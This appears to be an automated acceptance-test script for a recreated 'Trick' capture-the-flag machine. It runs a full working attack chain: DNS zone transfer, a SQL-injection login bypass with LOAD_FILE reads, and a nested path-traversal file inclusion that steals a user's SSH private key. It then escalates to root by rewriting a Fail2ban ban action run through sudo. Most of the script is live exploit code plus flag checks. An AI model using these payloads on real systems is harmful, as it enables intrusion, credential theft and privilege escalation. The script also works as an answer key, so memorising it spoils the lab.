#!/usr/bin/env python3
import os
import re
import socket
import subprocess
import sys
import tempfile
import time
from urllib.parse import urlencode
from urllib.request import Request, urlopen

TARGET = os.environ.get("TARGET", "trick-target")
BASE = "http://" + TARGET
USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]
KEY_PATH = "/tmp/trick-michael-id_rsa"

def run(args, *, timeout=20, check=True, capture=True):
    return subprocess.run(
        args,
        text=True,
        stdout=subprocess.PIPE if capture else subprocess.DEVNULL,
        stderr=subprocess.PIPE if capture else subprocess.DEVNULL,
        timeout=timeout,
        check=check,
    )

def http(host, path="/", data=None):
    headers = {"Host": host, "User-Agent": "trytopwn-independent-acceptance/1.0"}
    body = None
    if data is not None:
        body = urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    request = Request(BASE + path, data=body, headers=headers)
    with urlopen(request, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")

def login_probe(username):
    return http(
        "preprod-payroll.trick.htb",
        "/ajax.php?action=login",
        {"username": username, "password": "not-the-password"},
    ).strip()

def ssh(command, *, timeout=15, check=True):
    return run(
        [
            "ssh", "-i", KEY_PATH,
            "-o", "BatchMode=yes",
            "-o", "IdentitiesOnly=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=5",
            "michael@" + TARGET,
            command,
        ],
        timeout=timeout,
        check=check,
    )

def main():
    print("== DNS reconnaissance ==")
    target_ip = socket.gethostbyname(TARGET)
    reverse = run(["dig", "-x", target_ip, "@" + TARGET, "+short"]).stdout.strip()
    assert reverse == "trick.htb.", f"unexpected PTR: {reverse!r}"
    axfr = run(["dig", "axfr", "trick.htb", "@" + TARGET]).stdout
    assert "preprod-payroll.trick.htb." in axfr
    assert "preprod-marketing.trick.htb." not in axfr
    print("PASS: real PTR response and transferable authoritative zone")

    print("== Virtual-host discovery ==")
    landing = http("trick.htb", "/")
    payroll = http("preprod-payroll.trick.htb", "/")
    marketing = http("preprod-marketing.trick.htb", "/")
    assert "Coming Soon" in landing
    assert "Payroll Management System" in payroll
    assert "Technology that moves your business forward" in marketing
    print("PASS: default, payroll and marketing virtual hosts are distinct")

    print("== Real SQL injection and database FILE boundary ==")
    assert login_probe("not-a-real-user") == "3"
    assert login_probe("' OR 1=1 -- -") == "1"
    marker = "' OR IF(LOCATE('preprod-marketing.trick.htb',LOAD_FILE('/etc/nginx/http.d/trick.conf'))>0,1,0)=1 -- -"
    assert login_probe(marker) == "1", "MariaDB FILE read did not expose the actual Nginx vhost config"
    negative = "' OR IF(LOCATE('not-a-vhost.invalid',LOAD_FILE('/etc/nginx/http.d/trick.conf'))>0,1,0)=1 -- -"
    assert login_probe(negative) == "3", "boolean false condition did not change the response"
    denied_key = "' OR IF(LOAD_FILE('/home/michael/.ssh/id_rsa') IS NULL,1,0)=1 -- -"
    assert login_probe(denied_key) == "1", "MariaDB should not be able to read Michael's mode-0600 private key"
    print("PASS: login SQLi, boolean file-content inference and OS permission boundary")

    print("== Genuine PHP include traversal ==")
    passwd = http(
        "preprod-marketing.trick.htb",
        "/index.php?" + urlencode({"page": "....//....//....//etc/passwd"}),
    )
    assert re.search(r"^michael:x:1001:", passwd, re.M), "nested traversal did not read the real /etc/passwd"
    status = http(
        "preprod-marketing.trick.htb",
        "/index.php?" + urlencode({"page": "....//....//....//proc/self/status"}),
    )
    uid = re.search(r"^Uid:\s+(\d+)", status, re.M)
    assert uid and uid.group(1) == "1001", f"marketing PHP-FPM is not running as michael: {uid.group(0) if uid else 'Uid missing'}"
    private_key = http(
        "preprod-marketing.trick.htb",
        "/index.php?" + urlencode({"page": "....//....//....//home/michael/.ssh/id_rsa"}),
    )
    assert "BEGIN OPENSSH PRIVATE KEY" in private_key
    with open(KEY_PATH, "w", encoding="utf-8") as handle:
        handle.write(private_key.strip() + "\n")
    os.chmod(KEY_PATH, 0o600)
    print("PASS: one-pass ../ removal is bypassed; PHP-FPM as michael reads the real SSH key")

    print("== SSH foothold and Fail2ban configuration ==")
    identity = ssh("id").stdout
    assert "uid=1001(michael)" in identity and "security" in identity
    actual_user_flag = ssh("cat /home/michael/user.txt").stdout.strip()
    assert actual_user_flag == USER_FLAG
    sudo_list = ssh("sudo -n -l").stdout
    assert "/etc/init.d/fail2ban restart" in sudo_list
    permissions = ssh(
        "id; ls -ld /etc/fail2ban/action.d; ls -l /etc/fail2ban/action.d/iptables-multiport.conf; "
        "if test -w /etc/fail2ban/action.d; then echo DIR_WRITABLE; else echo DIR_NOT_WRITABLE; fi; "
        "if test -w /etc/fail2ban/action.d/iptables-multiport.conf; then echo FILE_WRITABLE; else echo FILE_NOT_WRITABLE; fi; "
        "grep -n 'actionban' /etc/fail2ban/action.d/iptables-multiport.conf",
        check=False,
    )
    print(permissions.stdout)
    assert "DIR_WRITABLE" in permissions.stdout, "michael cannot write to the action directory"
    assert "FILE_NOT_WRITABLE" in permissions.stdout, "the existing action file must remain root-owned"
    assert re.search(r"^\\s*actionban\\s*=", permissions.stdout, re.M), "real actionban directive missing"
    print("PASS: SSH as michael, User Flag, group-writable action directory and narrowly scoped sudo rule")

    print("== Real Fail2ban action execution as root ==")
    replace_action = (
        "set -eu; "
        "cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf; "
        "sed -i '/^actionban[[:space:]]*=/c\\actionban = cp /root/root.txt /tmp/root.txt; chmod 0644 /tmp/root.txt' "
        "/tmp/iptables-multiport.conf; "
        "rm /etc/fail2ban/action.d/iptables-multiport.conf; "
        "cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf; "
        "sudo /etc/init.d/fail2ban restart"
    )
    restarted = ssh(replace_action, timeout=25)
    assert restarted.returncode == 0, restarted.stderr

    # Keep the same source IP for all failed logins so the real sshd jail bans it.
    for _ in range(4):
        run(
            [
                "sshpass", "-p", "definitely-wrong-password",
                "ssh",
                "-o", "PreferredAuthentications=password",
                "-o", "PubkeyAuthentication=no",
                "-o", "NumberOfPasswordPrompts=1",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=4",
                "michael@" + TARGET,
                "true",
            ],
            timeout=8,
            check=False,
        )

    time.sleep(18)  # jail bantime is 15 seconds; reconnect after the real ban expires.
    root_flag = None
    last_error = ""
    for _ in range(8):
        try:
            result = ssh("cat /tmp/root.txt", timeout=8, check=False)
            if result.returncode == 0:
                root_flag = result.stdout.strip()
                break
            last_error = result.stderr
        except Exception as error:
            last_error = str(error)
        time.sleep(2)
    assert root_flag == ROOT_FLAG, f"Fail2ban action did not disclose the real Root Flag: {last_error}"
    print("PASS: modified real iptables-multiport action ran as root and exposed the Root Flag")

    print("PASS: complete DNS -> SQLi/FILE -> nested PHP LFI -> SSH -> Fail2ban root-action chain")

if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print(f"FAIL: {error}", file=sys.stderr)
        raise
